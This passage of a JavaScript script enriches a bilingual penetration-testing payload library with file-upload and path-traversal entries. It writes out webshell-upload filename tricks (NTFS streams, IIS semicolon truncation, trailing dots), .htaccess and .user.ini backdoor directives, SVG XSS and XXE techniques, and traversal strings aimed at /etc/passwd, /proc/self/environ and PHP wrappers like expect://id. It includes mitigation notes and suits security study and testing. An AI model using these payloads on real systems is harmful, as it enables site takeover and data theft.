    'https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html',
    'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files',
  ],
  tutorial: {
    overview: { zh: 'SVG 文件上传利用——利用 SVG 的 XML 基础特性实现 XSS(脚本执行)、SSRF(服务端请求伪造)和 XXE(实体注入)，扩展文件上传攻击面。', en: 'SVG file upload exploitation — leverage SVG XML foundation for XSS (script execution), SSRF (server-side request forgery), and XXE (entity injection), expanding the file upload attack surface.' },
    vulnerability: { zh: 'SVG 本质是 XML 文档，支持内嵌 <script> 标签、onload 等事件处理器、<image> 外部资源加载和 DOCTYPE 实体声明。仅校验 MIME 类型或扩展名的上传机制无法防御这些攻击向量。', en: 'SVG is inherently an XML document supporting embedded <script> tags, event handlers, <image> external resource loading, and DOCTYPE entity declarations. Upload mechanisms only checking MIME or extensions cannot defend against these vectors.' },
    exploitation: { zh: '上传包含 XSS payload 的 SVG 到可访问路径，当管理员或用户访问 SVG 时触发；通过 image 标签探测内网或读取云元数据；结合 DOCTYPE 实体声明实现 XXE 文件读取或 SSRF；在 SVG 注释/元数据中嵌入 PHP 代码结合 LFI 执行。', en: 'Upload XSS-injected SVG to accessible path to trigger when accessed; probe internal networks or cloud metadata via image tags; combine with DOCTYPE entity declaration for XXE/SSRF; embed PHP code in SVG comments/metadata for LFI execution.' },
    mitigation: { zh: '对 SVG 文件进行净化(移除 script/事件处理器/外部引用)；使用独立域名服务用户上传内容；在上传目录禁用脚本执行；考虑将 SVG 转为 PNG 等非脚本格式后存储。', en: 'Sanitize SVG files (remove scripts, event handlers, external references); serve uploaded content from a separate domain; disable script execution in upload directories; consider converting SVGs to non-scriptable formats.' },
    difficulty: 'intermediate',
  },
};

// ============ APPLY ENRICHMENTS ============

// Strategy: For each payload, replace entire execution array
// This is simpler and more reliable

function replaceAllExecSteps(payloadId, newCommands) {
  // Find payload and replace its execution array
  const idMarker = `id: '${esc(payloadId)}',`;
  const idx = content.indexOf(idMarker);
  if (idx < 0) { console.log('MISSING:', payloadId); return false; }

  // Find the execution array
  const execStart = content.indexOf('execution: [', idx);
  if (execStart < 0) { console.log('NO EXEC:', payloadId); return false; }

  // Find the end of execution array (matching brackets)
  let depth = 0;
  let inString = false;
  let stringChar = '';
  let execEnd = execStart + 13; // after 'execution: ['
  for (let i = execEnd; i < content.length; i++) {
    const c = content[i];
    if (inString) {
      if (c === stringChar && content[i-1] !== '\\') inString = false;
      continue;
    }
    if (c === "'" || c === '"' || c === '`') { inString = true; stringChar = c; continue; }
    if (c === '[') depth++;
    if (c === ']') {
      if (depth === 0) { execEnd = i + 1; break; }
      depth--;
    }
  }

  const before = content.slice(0, execStart);
  const after = content.slice(execEnd);
  const newExec = `execution: [\n${newCommands}\n    ]`;
  content = before + newExec + after;
  return true;
}

// Build new execution for file-upload-bypass (keep wafBypass etc., just replace exec)
const bypassExec = [
  // Step 0: Extension bypass (comprehensive)
  `      {\r\n        title: ${i18nObj('1. 扩展名绕过（完整版）', '1. Extension bypass (complete)')},\r\n        command: \`${extBypassCmd.replace(/`/g, '\\`')}\`,\r\n        description: ${i18nObj('PHP/ASP/JSP/其他服务端扩展名变体全覆盖，包含大小写混写、双扩展名、分号拼接(IIS)、空字节截断(%00/\\\\x00)、NTFS 备用数据流(::\\$DATA)、双写绕过、换行/空格/制表符注入、编辑器上传路径探测', 'Complete PHP/ASP/JSP/server-side extension variants: case mixing, double extensions, semicolon (IIS), null-byte, NTFS ADS, double-write, whitespace injection, and editor upload path discovery')},\r\n        platform: 'all',\r\n        syntaxBreakdown: [\r\n          { part: '.phtml .pht .phar .php5 .php7', explanation: ${i18nObj('PHP 别名扩展名（黑名单常见盲区）', 'PHP alias extensions (common blacklist blind spots)')}, type: 'value' },\r\n          { part: '.php;.jpg .asp;.jpg', explanation: ${i18nObj('分号拼接绕过 (IIS 6.0 解析特性)', 'Semicolon concatenation (IIS 6.0 parser behavior)')}, type: 'technique' },\r\n          { part: '%00 \\\\x00', explanation: ${i18nObj('空字节截断 (PHP<5.3.4 底层 C 函数)', 'Null-byte truncation (PHP<5.3.4 C-level)')}, type: 'encoding' },\r\n          { part: '::\\$DATA', explanation: ${i18nObj('NTFS 备用数据流 (Windows)', 'NTFS alternate data stream (Windows)')}, type: 'technique' },\r\n          { part: '.pphphp .asaspp', explanation: ${i18nObj('双写绕过 (删除敏感后缀后仍保留)', 'Double-write bypass (survives suffix removal)')}, type: 'technique' },\r\n          { part: '.asp .aspx .jsp .war', explanation: ${i18nObj('ASP/ASPX/JSP 等非 PHP 扩展名', 'Non-PHP extensions (ASP, ASPX, JSP)')}, type: 'value' },\r\n          { part: '/kindeditor/ /ueditor/', explanation: ${i18nObj('常见编辑器上传路径', 'Common editor upload paths')}, type: 'path' },\r\n        ]\r\n      },`,
  // Step 1: Content-Type bypass (comprehensive)
  `      {\r\n        title: ${i18nObj('2. Content-Type 绕过（完整版）', '2. Content-Type bypass (complete)')},\r\n        command: \`${ctCmd.replace(/`/g, '\\`')}\`,\r\n        description: ${i18nObj('所有常见 Content-Type 值和 Content-Disposition 变体，用于探测服务端 MIME 校验策略', 'All common Content-Type values and Content-Disposition variants for probing server-side MIME validation strategy')},\r\n        platform: 'all',\r\n        syntaxBreakdown: [\r\n          { part: 'image/jpeg image/png image/gif', explanation: ${i18nObj('标准图片 MIME 类型（白名单常见值）', 'Standard image MIME types (common allowlist values)')}, type: 'header' },\r\n          { part: 'image/webp image/bmp image/tiff', explanation: ${i18nObj('非主流图片类型（可能未纳入检测）', 'Less common image types (may not be checked)')}, type: 'header' },\r\n          { part: 'application/octet-stream', explanation: ${i18nObj('通用二进制流（绕过类型检测）', 'Generic binary stream (bypass type checks)')}, type: 'header' },\r\n          { part: 'filename*=UTF-8', explanation: ${i18nObj('RFC 5987 文件名编码（可能绕过检测）', 'RFC 5987 filename encoding (may bypass detection)')}, type: 'technique' },\r\n          { part: 'Transfer-Encoding: chunked', explanation: ${i18nObj('分块传输编码（绕过 WAF 流检测）', 'Chunked transfer encoding (bypass WAF stream inspection)')}, type: 'header' },\r\n        ]\r\n      },`,
  // Step 2: Image webshell (comprehensive)
  `      {\r\n        title: ${i18nObj('3. 图片马与魔术字节（完整版）', '3. Image webshell & magic bytes (complete)')},\r\n        command: \`${imgCmd.replace(/`/g, '\\`')}\`,\r\n        description: ${i18nObj('图片马制作方法全覆盖：Windows copy /b 合成、六种魔术字节(GIF/PNG/JPEG/BMP/PDF/ZIP)预处理、ExifTool 元数据注入、SVG XSS/SSRF 上传', 'Complete image webshell creation: Windows copy /b merge, six magic byte types (GIF/PNG/JPEG/BMP/PDF/ZIP), ExifTool metadata injection, SVG XSS/SSRF upload')},\r\n        platform: 'all',\r\n        syntaxBreakdown: [\r\n          { part: 'GIF89a;', explanation: ${i18nObj('GIF 魔术字节——最常用绕过标记', 'GIF magic bytes — most common bypass marker')}, type: 'encoding' },\r\n          { part: 'copy /b', explanation: ${i18nObj('Windows 二进制文件合并命令', 'Windows binary file merge command')}, type: 'command' },\r\n          { part: 'exiftool -Comment=', explanation: ${i18nObj('ExifTool 元数据注入（图片 EXIF 嵌入 PHP）', 'ExifTool metadata injection (embed PHP in image EXIF)')}, type: 'command' },\r\n          { part: '<svg ... onload=', explanation: ${i18nObj('SVG 事件注入——独立攻击向量', 'SVG event injection — independent attack vector')}, type: 'tag' },\r\n        ]\r\n      },`,
  // Step 3: .htaccess/.user.ini
  `      {\r\n        title: ${i18nObj('4. .htaccess / .user.ini 配置上传', '4. .htaccess / .user.ini config upload')},\r\n        command: \`${htaccessCmd.replace(/`/g, '\\`')}\`,\r\n        description: ${i18nObj('上传 Apache .htaccess 或 PHP-FPM .user.ini 配置文件覆盖目录解析规则，实现图片→脚本映射或自动包含后门', 'Upload Apache .htaccess or PHP-FPM .user.ini to override directory parsing rules, mapping images to scripts or auto-including backdoors')},\r\n        platform: 'linux',\r\n        syntaxBreakdown: [\r\n          { part: 'AddType application/x-httpd-php .jpg', explanation: ${i18nObj('Apache 指令：将 .jpg 映射为 PHP MIME 类型', 'Apache directive: map .jpg to PHP MIME type')}, type: 'technique' },\r\n          { part: 'auto_prepend_file=shell.jpg', explanation: ${i18nObj('PHP-FPM 指令：每页加载前自动包含 shell.jpg', 'PHP-FPM directive: auto-include shell.jpg before every page load')}, type: 'technique' },\r\n          { part: 'CVE-2013-4547', explanation: ${i18nObj('Nginx 文件名解析漏洞', 'Nginx filename parsing vulnerability')}, type: 'value' },\r\n        ]\r\n      },`,
  // Step 4: NTFS + platform quirks
  `      {\r\n        title: ${i18nObj('5. NTFS 流与平台解析特性', '5. NTFS stream & platform parser quirks')},\r\n        command: \`# === Windows NTFS 备用数据流 ===\r\nfilename="shell.php::\\$DATA"\r\nfilename="shell.php::\\$DATA.jpg"\r\nfilename="shell.php::INDEX_ALLOCATION"\r\nfilename="shell.php:evil.php"\r\nfilename="shell.php:evil.txt:\\$DATA"\r\n\r\n# === IIS 6.0 分号截断 ===\r\nfilename="shell.asp;.jpg"\r\nfilename="shell.aspx;.jpg"\r\nfilename="shell.asa;.jpg"\r\nfilename="shell.cer;.jpg"\r\nfilename="shell.cdx;.jpg"\r\n\r\n# === IIS 7.0+ 路径解析（特定配置） ===\r\n# 上传 shell.jpg，访问 http://target.com/uploads/shell.jpg/.php\r\n\r\n# === Nginx + PHP (CVE-2013-4547) ===\r\n# 上传 shell.jpg[空格][换行].php\r\n\r\n# === Apache 多后缀解析 ===\r\n# shell.php.jpg → 若 .jpg 不可识别，回溯解析 .php\r\n# shell.php.test → Apache 从左到右匹配已知处理器\r\n\r\n# === 空格/点号截断 (Windows) ===\r\n# Windows 自动去除文件名末尾空格和点号：\r\nfilename="shell.php "\r\nfilename="shell.php."\r\nfilename="shell.php..."\r\nfilename="shell.php .jpg"\r\n\r\n# === ::\\$DATA 结合其他技术 ===\r\nfilename="shell.php::\\$DATA"\r\nfilename="shell.asp;.jpg::\\$DATA"\`,\r\n        description: ${i18nObj('Windows NTFS ADS、IIS/Apache/Nginx 解析特性、空格/点号截断等平台特有绕过技术汇总', 'Windows NTFS ADS, IIS/Apache/Nginx parser quirks, space/dot truncation — platform-specific bypass techniques')},\r\n        platform: 'all',\r\n        syntaxBreakdown: [\r\n          { part: '::\\$DATA', explanation: ${i18nObj('NTFS 备用数据流——Windows 自动忽略', 'NTFS ADS — Windows auto-ignores this suffix')}, type: 'technique' },\r\n          { part: '.asp;.jpg', explanation: ${i18nObj('IIS 6.0 分号截断——IIS 只解析 ; 前部分', 'IIS 6.0 semicolon truncation')}, type: 'technique' },\r\n          { part: 'shell.jpg/.php', explanation: ${i18nObj('IIS 7.0+ 路径解析（特定 FastCGI 配置）', 'IIS 7.0+ path parsing (specific FastCGI config)')}, type: 'technique' },\r\n          { part: 'shell.php .jpg', explanation: ${i18nObj('Windows 尾随空格自动去除', 'Windows trailing space auto-removal')}, type: 'technique' },\r\n        ]\r\n      },`,
];

// Apply file-upload-bypass exec replacement
console.log('Enriching file-upload-bypass execution...');
replaceAllExecSteps('file-upload-bypass', bypassExec.join('\n'));

// Build new execution for file-mime
const mimeExec = [
  `      {\r\n        title: ${i18nObj('1. Content-Type 全量探测', '1. Full Content-Type probe')},\r\n        command: \`${mimeStep1Cmd.replace(/`/g, '\\`')}\`,\r\n        description: ${i18nObj('系统化探测服务端 MIME 校验策略——正常上传建立基线、伪造 Content-Type 测试、双扩展名+MIME 组合测试', 'Systematic probe of server-side MIME validation strategy — baseline, Content-Type spoofing, and double-extension combos')},\r\n        platform: 'all',\r\n        syntaxBreakdown: [\r\n          { part: 'image/jpeg image/png image/gif', explanation: ${i18nObj('标准白名单类型（应通过）', 'Standard allowlist types (should pass)')}, type: 'header' },\r\n          { part: 'image/webp image/bmp image/tiff', explanation: ${i18nObj('较少见的图片类型（可能未过滤）', 'Less common image types (may not be filtered)')}, type: 'header' },\r\n          { part: 'type=image/jpeg;filename=test.jpg', explanation: ${i18nObj('MIME+文件名双重控制测试', 'MIME+filename dual-control test')}, type: 'technique' },\r\n          { part: 'application/octet-stream', explanation: ${i18nObj('通用二进制（常被接受）', 'Generic binary (often accepted)')}, type: 'header' },\r\n          { part: 'video/mp4 audio/mpeg', explanation: ${i18nObj('多媒体类型（可能绕过图片检查）', 'Multimedia types (may bypass image checks)')}, type: 'header' },\r\n        ]\r\n      },`,
  `      {\r\n        title: ${i18nObj('2. Magic Bytes 全量伪造', '2. Full magic byte forgery')},\r\n        command: \`${mimeStep2Cmd.replace(/`/g, '\\`')}\`,\r\n        description: ${i18nObj('十种文件头魔术字节伪造(GIF/PNG/JPEG/BMP/PDF/ZIP/TIFF/RIFF/GZIP/7z)，覆盖所有常见文件格式的内容检测绕过', 'Ten file header magic byte forgeries (GIF/PNG/JPEG/BMP/PDF/ZIP/TIFF/RIFF/GZIP/7z) covering all common content-based detection bypasses')},\r\n        platform: 'all',\r\n        syntaxBreakdown: [\r\n          { part: 'GIF89a; GIF87a;', explanation: ${i18nObj('GIF 格式魔术字节（最常用）', 'GIF format magic bytes (most common)')}, type: 'encoding' },\r\n          { part: '\\\\x89PNG\\\\r\\\\n\\\\x1a\\\\n', explanation: ${i18nObj('PNG 文件头（8 字节魔术字节）', 'PNG header (8-byte magic bytes)')}, type: 'encoding' },\r\n          { part: '\\\\xff\\\\xd8\\\\xff\\\\xe0', explanation: ${i18nObj('JPEG 文件头（SOI+APP0 标记）', 'JPEG header (SOI+APP0 marker)')}, type: 'encoding' },\r\n          { part: 'BM', explanation: ${i18nObj('BMP 文件头', 'BMP file header')}, type: 'encoding' },\r\n          { part: '%PDF-1.4', explanation: ${i18nObj('PDF 文件头', 'PDF file header')}, type: 'encoding' },\r\n          { part: 'PK\\\\x03\\\\x04', explanation: ${i18nObj('ZIP 文件头', 'ZIP file header')}, type: 'encoding' },\r\n          { part: 'II\\\\x2a\\\\x00 MM\\\\x00\\\\x2a', explanation: ${i18nObj('TIFF 文件头 (Little/Big Endian)', 'TIFF header (Little/Big Endian)')}, type: 'encoding' },\r\n          { part: 'RIFF', explanation: ${i18nObj('RIFF 容器格式 (WebP/AVI)', 'RIFF container format (WebP/AVI)')}, type: 'encoding' },\r\n        ]\r\n      },`,
];

console.log('Enriching file-mime execution...');
replaceAllExecSteps('file-mime', mimeExec.join('\n'));

// Build new execution for file-traversal
const traversalExec = [
  `      {\r\n        title: ${i18nObj('1. 路径遍历 Payload 大全', '1. Complete path traversal payloads')},\r\n        command: \`${traversalCmd.replace(/`/g, '\\`')}\`,\r\n        description: ${i18nObj('最全面的路径遍历 Payload 集合：基础 ../ 遍历、多层编码绕过(URL/双重/Unicode/双写/点号)、PHP 伪协议、Windows 路径、常见敏感文件、SSRF file:// 路径', 'Most comprehensive path traversal payload collection: basic ../, multi-layer encoding bypass (URL/double/Unicode/double-write/dot), PHP wrappers, Windows paths, common sensitive files, SSRF file:// paths')},\r\n        platform: 'all',\r\n        syntaxBreakdown: [\r\n          { part: '../../../../etc/passwd', explanation: ${i18nObj('经典 Linux 敏感文件读取', 'Classic Linux sensitive file read')}, type: 'path' },\r\n          { part: '%2e%2e%2f', explanation: ${i18nObj('URL 编码绕过 ../ 过滤', 'URL-encoded ../ filter bypass')}, type: 'encoding' },\r\n          { part: '%252e%252e%252f', explanation: ${i18nObj('双重 URL 编码绕过', 'Double URL-encoded bypass')}, type: 'encoding' },\r\n          { part: '..%c0%af', explanation: ${i18nObj('Unicode/UTF-8 超长编码', 'Unicode/UTF-8 overlong encoding')}, type: 'encoding' },\r\n          { part: '....//', explanation: ${i18nObj('双写绕过 (.. 被替换为空)', 'Double-write bypass (.. replaced with empty)')}, type: 'technique' },\r\n          { part: 'php://filter/', explanation: ${i18nObj('PHP Filter Wrapper 读取源码', 'PHP Filter Wrapper for source code reading')}, type: 'value' },\r\n          { part: 'php://input', explanation: ${i18nObj('PHP Input Wrapper — POST 正文执行', 'PHP Input Wrapper — POST body execution')}, type: 'value' },\r\n          { part: 'data://text/plain;base64,', explanation: ${i18nObj('Data URL — 直接嵌入代码', 'Data URL — inline code execution')}, type: 'value' },\r\n          { part: 'expect://id', explanation: ${i18nObj('Expect Wrapper — 直接命令执行', 'Expect Wrapper — direct command execution')}, type: 'value' },\r\n          { part: 'zip:// phar://', explanation: ${i18nObj('压缩包伪协议——从 ZIP/Phar 提取执行', 'Archive wrappers — extract and execute from ZIP/Phar')}, type: 'value' },\r\n          { part: 'C:\\\\Windows\\\\', explanation: ${i18nObj('Windows 路径遍历', 'Windows path traversal')}, type: 'path' },\r\n          { part: '/proc/self/environ', explanation: ${i18nObj('/proc 伪文件系统——进程环境变量', '/proc pseudo-filesystem — process environment')}, type: 'path' },\r\n          { part: '/var/log/apache2/access.log', explanation: ${i18nObj('日志文件路径——日志投毒目标', 'Log file paths — log poisoning targets')}, type: 'path' },\r\n          { part: 'WEB-INF/web.xml', explanation: ${i18nObj('Java Web 应用配置文件', 'Java web application config file')}, type: 'path' },\r\n          { part: 'file:///etc/passwd', explanation: ${i18nObj('SSRF file:// 协议本地文件读取', 'SSRF file:// protocol local file read')}, type: 'technique' },\r\n        ]\r\n      },`,
];

console.log('Enriching file-traversal execution...');
replaceAllExecSteps('file-traversal', traversalExec.join('\n'));

// Insert new payloads before the last payload or at the end of web category
// Insert file-upload-config and file-upload-svg after file-upload-bypass
function insertNewPayload(afterId, payloadObj) {
  const afterMarker = `id: '${esc(afterId)}'`;
  const afterIdx = content.indexOf(afterMarker);
  if (afterIdx < 0) { console.log('MISSING:', afterId); return false; }

  // Find the end of this payload (next `  },` at same nesting level)
  let depth = 0, pos = afterIdx;
  for (let i = afterIdx; i < content.length; i++) {
    const c = content[i];
    if (c === '{') depth++;
    if (c === '}') {
      depth--;
      if (depth === 0) { pos = i + 1; break; }
    }
  }

  // Skip to after the comma
  while (pos < content.length && content[pos] !== ',') pos++;
  pos++; // skip the comma

  // Generate payload string
  const p = payloadObj;
  const execEntries = p.execution.map(e => {
    const sb = (e.syntaxBreakdown || []).map(b =>
      `          { part: '${b.part.replace(/'/g, "\\'")}', explanation: ${i18nObj(b.zh, b.en)}, type: '${b.type}' },`
    ).join('\n');
    return `      {
        title: ${i18nObj(typeof e.title==='object'?e.title.zh:e.title, typeof e.title==='object'?e.title.en:e.title)},
        command: \`${(e.command||'').replace(/`/g, '\\`')}\`,
        description: ${i18nObj(typeof e.description==='object'?e.description.zh:e.description, typeof e.description==='object'?e.description.en:e.description)},
        platform: '${e.platform||'all'}',
        syntaxBreakdown: [
${sb}
        ]
      },`;
  }).join('\n');

  const acEntries = (p.attackChain||[]).map(s =>
    `      { title: ${i18nObj(typeof s.title==='object'?s.title.zh:s.title, typeof s.title==='object'?s.title.en:s.title)}, description: ${i18nObj(typeof s.description==='object'?s.description.zh:s.description, typeof s.description==='object'?s.description.en:s.description)}${s.payload ? `, payload: '${s.payload.replace(/'/g, "\\'")}'` : ''} },`
  ).join('\n');

  const refs = (p.references||[]).map(r => `      '${r}',`).join('\n');
  const prereqs = (p.prerequisites||[]).map(pr => `      ${i18nObj(pr.zh, pr.en)},`).join('\n');
  const tags = (p.tags||[]).map(t => `'${t}'`).join(', ');

  const payloadStr = `  {
    id: '${p.id}',
    name: ${i18nObj(p.name.zh, p.name.en)},
    description: ${i18nObj(p.description.zh, p.description.en)},
    category: ${i18nObj(p.category.zh, p.category.en)},
    subCategory: ${i18nObj(p.subCategory.zh, p.subCategory.en)},
    tags: [${tags}],
    prerequisites: [
${prereqs}
    ],
    execution: [
${execEntries}
    ],
    attackChain: [
${acEntries}
    ],
    analysis: ${i18nObj(p.analysis.zh, p.analysis.en)},
    references: [
${refs}
    ],
    tutorial: {
      overview: ${i18nObj(p.tutorial.overview.zh, p.tutorial.overview.en)},
      vulnerability: ${i18nObj(p.tutorial.vulnerability.zh, p.tutorial.vulnerability.en)},
      exploitation: ${i18nObj(p.tutorial.exploitation.zh, p.tutorial.exploitation.en)},
      mitigation: ${i18nObj(p.tutorial.mitigation.zh, p.tutorial.mitigation.en)},
      difficulty: '${p.tutorial.difficulty}'
    }
  },
`;

  content = content.slice(0, pos) + '\n' + payloadStr + content.slice(pos);
  return true;
}

console.log('Adding new payload: file-upload-config...');
insertNewPayload('file-upload-bypass', newPayloadConfig);
console.log('Adding new payload: file-upload-svg...');
insertNewPayload('file-upload-bypass', newPayloadSvg);

writeFileSync(filePath, content, 'utf8');
console.log('Done! File written.');
